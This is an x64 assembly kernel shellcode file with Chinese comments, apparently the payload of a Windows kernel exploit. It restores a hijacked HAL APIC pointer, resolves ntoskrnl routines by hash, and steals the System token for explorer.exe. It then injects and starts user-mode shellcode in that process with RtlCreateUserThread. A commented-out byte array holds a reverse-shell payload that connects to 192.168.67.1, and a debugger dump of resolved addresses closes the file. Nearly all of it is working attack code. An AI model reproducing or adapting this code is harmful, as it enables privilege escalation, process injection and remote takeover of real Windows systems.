; eq 0xFFFFF78000000550 0xFFFFF784800005B8;eq 0xFFFFF78000000558 0xFFFFF803570C6BB0;

[BITS 64]
;APIC 指针保存地址
OFFSET_HALPINTERRCONT    EQU 0x00
;APIC 函数地址
OFFSET_PHALPAPICREQ    EQU 0x08
 
OFFSET_NTBASE            EQU 0x10

[SECTION .text]

_main:

    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15
    push rcx
    push rdx
    push rbx
    push rsi
    push rdi

    mov rax,0fffff780000004f0h
    mov rax,[rax]
    test rax,rax
    ;jnz Error

    sub rsp,0x600



;r14 保存全局变量的指针 0xFFFFF78000000550
    mov qword r14, 0FFFFF78000000550h
; 恢复 Hook
    mov qword rax, [r14 + OFFSET_HALPINTERRCONT]
    mov qword rbx, [r14 + OFFSET_PHALPAPICREQ]
    mov [rax], qword rbx

;查找NT基地址
    mov r12,0x20
    sti
    xor rcx, rcx
    mov r10,cr8
    mov cr8, rcx
    mov ecx, 0xc0000082
    rdmsr
    and eax, 0xFFFFF000
    shl rdx, 0x20
    add rax, rdx

_find_nt_base:
    sub rax, 0x1000
    cmp word [rax], 0x5a4d
    jne _find_nt_base
    
    mov r15, rax
    mov rbp,rax
; 保存NtosKrnl的基地址
    mov [r14 + OFFSET_NTBASE], r15

;rbp 保存 基地址
Find_Export_Name_Table :
	xor rax,rax
	xor rcx,rcx
	xor rdx,rdx
	xor rdi,rdi
    xor rbx,rbx
	mov eax, [rbp + 0x3c]
	mov ecx, [rbp + rax + 0x88]
	add rcx, rbp
	mov ebx, [rcx + 0x20]
	add rbx, rbp
    xor rax,rax

Next_Name :
	xor rdx,rdx
	xor rsi,rsi
	inc rdi
	mov esi, [rbx + rdi * 4]
	add rsi, rbp
	cdq	

Function_Name :

	mov byte al, [rsi]
	cmp al, ah

jz Check_Function

	ror edx, 7
	add edx, eax
	inc rsi

jmp Function_Name

Check_Function :

    cmp edx, 2AFB19CDh       ;nt!MmGetSystemRoutineAddress
    jz Set_Function

	cmp edx, 5B94C78Dh       ;nt!ObOpenObjectByPointer
	jz Set_Function

	cmp edx, 0140A7AEh       ;nt!ZwAllocateVirtualMemory
	jz Set_Function

	cmp edx, 58644845h       ;nt!KeStackAttachProcess
	jz Set_Function
	
	cmp edx,99DD909Fh        ;nt!RtlCreateUserThread
	jz Set_Function

	cmp edx, 0AE461869h      ;nt!KeUnstackDetachProcess
	jz Set_Function 

    cmp edx, 2A3FFF45h       ;nt!ExAllocatePool
    jz Set_Function
                            
    cmp edx, 12245C8Ah       ;nt!RtlFindExportedRoutineByName
    jz Set_Function

jmp Next_Name


Set_Function:

	push rbx
	xor rbx,rbx
	mov ebx, [rcx + 24h]
	add rbx, rbp 

	mov word di, [rbx + 2 * rdi]	;di 指向导出表序号
	mov ebx, [rcx + 0x1c]	;指向导出表指向函数的指针VA

	add rbx, rbp	;ebx 指向储存函数的指针

	mov r8d,[rbx + 4 * rdi] ;函数地址

	add r8,rbp ;r8 == Function

	;mov [r14+r9],r8
	;add r9,08h			; Set Functions

    ;保存函数 从0x20开始
	mov [r14+r12],r8

	add r12,08h

	pop rbx

    cmp r12,0x60

jnz Next_Name
    ;rax = EPROCESS
    mov  rax,[gs:0x188]
    mov  rax,[rax+0x0B8]
    mov rdx,0x7265726f6c707865
Find_EPC:
;PID == 4
    mov rbx,[rax+0x2e8]
    cmp rbx,4
    jz PID
    mov rcx,[rax+0x450]
    cmp rcx,rdx
    jz FindIt
;遍历 EPROCESS 链表
BST:
    mov rax,[rax+0x2F0]
    sub rax,0x2F0
    jmp Find_EPC

;System进程
PID:
    mov r10,[rax+0x360]
    jmp BST

FindIt:
;查找到EPROCESS

;保存 EPROCESS
    mov rbx,0x0fffff78000000568
    mov [rbx],rax
;修改Token
    mov [rax+0x360],r10
    mov r13,rax

    jmp LS
    UNICODE_Strings: db 0x0D,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    Strings:db 0x50,0x73,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x54,0x79,0x70,0x65,0x00

;UNICODE STRING
LS:
    xor rcx,rcx
    mov rdx,0x100

;ExAllocatePool
    
    mov rdi,0fffff78000000570h
    call [rdi]

    lea rbx,[rel UNICODE_Strings+0x08]

    lea rsi,[rel Strings]

    mov rdi,rax

    mov rcx,0x0D

    rep movsb

    mov [rbx],rax

;RtlFindExportedRoutineByName

;r15 = NtosKrnl Base
    mov rcx,r15
    mov rdx,rax
    mov rdi,0fffff780000005a0h
    call [rdi]

    cmp rax,0
    jz Error

    mov rax,[rax]

;ObOpenObjectByPointer((PVOID)EPROCESS,
;        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
;        NULL,
;        GENERIC_ALL,
;        *PsProcessType,
;        KernelMode,
;        &H_Process
;    );

;rax = PsProcessType
    mov QWORD [rsp+0x20],rax
    mov QWORD [rsp+0x28],0
;&H_Process
    mov rsi,0fffff78000000480h
    mov QWORD [rsp+0x30],rsi
;(PVOID)EPROCESS
    mov rcx,r13
    mov rdx,0x240
    xor r8,r8
    mov r9,0x10000000
    mov rax,0fffff78000000590h
    call [rax]

    ;db 0xcc

;ZwAllocateVirtualMemory(
;    H_Process,
;    &func_address,
;    0,
;    &func_size,
;    MEM_COMMIT,
;    PAGE_EXECUTE_READWRITE
;);

;H_PROCESS = [0fffff78000000480h]
    mov rcx,0fffff78000000480h
    mov rcx,[rcx]

;&func_address = [0fffff78000000488]

; &func_size = [0fffff78000000490]
    mov QWORD [rsp+0x20],0x1000
    mov QWORD [rsp+0x28],0x40
    mov rdx,0fffff78000000488h
    xor r8,r8
    mov r9,0fffff78000000490h
    mov QWORD [r9],2000h
    mov rax,0fffff780000005a8h
    call [rax]

;KeStackAttachProcess((PEPROCESS)EPROCESS, &StAte);

;&StAte = [0fffff780000004a0]
    mov rdx,0fffff780000004a0h
    mov rcx,r13
    mov rax,0fffff78000000578h
    call [rax]
    jmp RCodes

; Memcpy
RCodes:

    lea rsi,[rel R3_ShellCodes]
    mov rax,0fffff78000000488h
    mov rax,[rax]
    mov rdi,rax

    mov rcx,0x400 ;Copy Size

    rep movsb

; RtlCreateUserThread(
;    H_Process,
;    0,
;    0,
;    0,
;    0,
;    0,
;    func_address,
;    func_address,
;    H_UserThRead,
;    0
;);

;H_Process
    mov rcx,0fffff78000000480h
    mov rcx,[rcx]
    xor rdx,rdx
    xor r8,r8
    xor r9,r9

    mov QWORD [rsp+0x20],0x00
    mov QWORD [rsp+0x28],0x00

    mov rax,0fffff78000000488h
    mov rax,[rax]
    mov QWORD [rsp+0x30],rax
    mov QWORD [rsp+0x38],rax
    mov rax,0fffff78000000650h
    mov QWORD [rsp+0x40],rax
    mov QWORD [rsp+0x48],0x00


    mov rax,0fffff78000000598h
    call [rax]


;KeUnstackDetachProcess(&StAte);

    mov rcx,0fffff780000004a0h
    mov rax,0fffff78000000580h
    call [rax]


Error:
    mov r10,0x02
    mov cr8,r10
    
    mov rax,0fffff780000004f0h
    mov rbx,rax
    mov rax,[rax]
    inc rax
    mov [rbx],rax

    cli

    add rsp,0x600

    mov rax, r14
    add rax,0x08
    pop rdi
    pop rsi
    pop rbx
    pop rdx
    pop rcx
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    ;db 0xcc
    jmp [rax]
R3_ShellCodes: db 0x90
;Set R3 Shellcode
;R3_ShellCodes:db 0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50,0x8B,0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,0x59,0x5A,0x48,0x8B,0x12,0xE9,0x57,0xFF,0xFF,0xFF,0x5D,0x49,0xBE,0x77,0x73,0x32,0x5F,0x33,0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xE6,0x48,0x81,0xEC,0xA0,0x01,0x00,0x00,0x49,0x89,0xE5,0x49,0xBC,0x02,0x00,0x06,0x60,0xC0,0xA8,0x43,0x01,0x41,0x54,0x49,0x89,0xE4,0x4C,0x89,0xF1,0x41,0xBA,0x4C,0x77,0x26,0x07,0xFF,0xD5,0x4C,0x89,0xEA,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xBA,0x29,0x80,0x6B,0x00,0xFF,0xD5,0x50,0x50,0x4D,0x31,0xC9,0x4D,0x31,0xC0,0x48,0xFF,0xC0,0x48,0x89,0xC2,0x48,0xFF,0xC0,0x48,0x89,0xC1,0x41,0xBA,0xEA,0x0F,0xDF,0xE0,0xFF,0xD5,0x48,0x89,0xC7,0x6A,0x10,0x41,0x58,0x4C,0x89,0xE2,0x48,0x89,0xF9,0x41,0xBA,0x99,0xA5,0x74,0x61,0xFF,0xD5,0x48,0x81,0xC4,0x40,0x02,0x00,0x00,0x49,0xB8,0x63,0x6D,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xE2,0x57,0x57,0x57,0x4D,0x31,0xC0,0x6A,0x0D,0x59,0x41,0x50,0xE2,0xFC,0x66,0xC7,0x44,0x24,0x54,0x01,0x01,0x48,0x8D,0x44,0x24,0x18,0xC6,0x00,0x68,0x48,0x89,0xE6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xFF,0xC0,0x41,0x50,0x49,0xFF,0xC8,0x4D,0x89,0xC1,0x4C,0x89,0xC1,0x41,0xBA,0x79,0xCC,0x3F,0x86,0xFF,0xD5,0x48,0x31,0xD2,0x48,0xFF,0xCA,0x8B,0x0E,0x41,0xBA,0x08,0x87,0x1D,0x60,0xFF,0xD5,0xBB,0xF0,0xB5,0xA2,0x56,0x41,0xBA,0xA6,0x95,0xBD,0x9D,0xFF,0xD5,0x48,0x83,0xC4,0x28,0x3C,0x06,0x7C,0x0A,0x80,0xFB,0xE0,0x75,0x05,0xBB,0x47,0x13,0x72,0x6F,0x6A,0x00,0x59,0x41,0x89,0xDA,0xFF,0xD5
;db 0x90,0x00
;0: kd> dqs fffff780`00000550
;fffff780`00000550  fffff784`800005b8
;fffff780`00000558  fffff803`570c6bb0
;fffff780`00000560  fffff803`56613000 nt!SeConvertSecurityDescriptorToStringSecurityDescriptor <PERF> (nt+0x0)
;fffff780`00000568  ffff990e`d04ee340
;fffff780`00000570  fffff803`5674b1d0 nt!ExAllocatePool
;fffff780`00000578  fffff803`566d0f50 nt!KeStackAttachProcess
;fffff780`00000580  fffff803`5663dd80 nt!KeUnstackDetachProcess
;fffff780`00000588  fffff803`56cb0ff0 nt!MmGetSystemRoutineAddress
;fffff780`00000590  fffff803`56c82c90 nt!ObOpenObjectByPointer
;fffff780`00000598  fffff803`56ede960 nt!RtlCreateUserThread
;fffff780`000005a0  fffff803`56cb1e80 nt!RtlFindExportedRoutineByName
;fffff780`000005a8  fffff803`567cc0e0 nt!ZwAllocateVirtualMemory
